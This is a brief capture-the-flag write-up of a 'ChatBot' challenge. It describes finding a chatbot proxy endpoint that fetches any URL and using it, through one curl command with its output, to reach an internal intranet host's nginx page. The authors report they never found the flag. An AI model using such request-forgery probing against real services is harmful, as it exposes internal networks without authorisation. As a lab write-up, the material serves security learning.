# ChatBot

## Description

EvilGouv a récemment ouvert un service de chat-bot, vous savez ces trucs que personne n'aime. Bon en plus d'être particulièrement nul, il doit forcément y avoir une faille. Trouvez un moyen d'accéder à l'intranet !

## Search

At the begin we tried the different options of the chatbot while watching the network analyzer. We found an endpoint named `proxy` and after some test we discovered this proxy can be used to process any http(s) GET request. So we tried lot of IP/domain and found the nginx default page on http://intranet/. 

```
$ curl https://challengecybersec.fr/b34658e7f6221024f8d18a7f0d3497e4/proxy?url=http://intranet/ | json_pp
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   698  100   698    0     0   5057      0 --:--:-- --:--:-- --:--:--  5057
{
   "contents" : "<!DOCTYPE html>\n<html>\n<head>\n<title>Welcome to nginx!</title>\n<style>\n    body {\n        width: 35em;\n        margin: 0 auto;\n        font-family: Tahoma, Verdana, Arial, sans-serif;\n    }\n</style>\n</head>\n<body>\n<h1>Welcome to nginx!</h1>\n<p>If you see this page, the nginx web server is successfully installed and\nworking. Further configuration is required.</p>\n\n<p>For online documentation and support please refer to\n<a href=\"http://nginx.org/\">nginx.org</a>.<br/>\nCommercial support is available at\n<a href=\"http://nginx.com/\">nginx.com</a>.</p>\n\n<p><em>Thank you for using nginx.</em></p>\n</body>\n</html>\n",
   "icon" : "Null",
   "title" : "Welcome to nginx!"
}

```

We also noticed that some range of IP return "forbidden" and others return "not found" but we never found the flag for this challenge.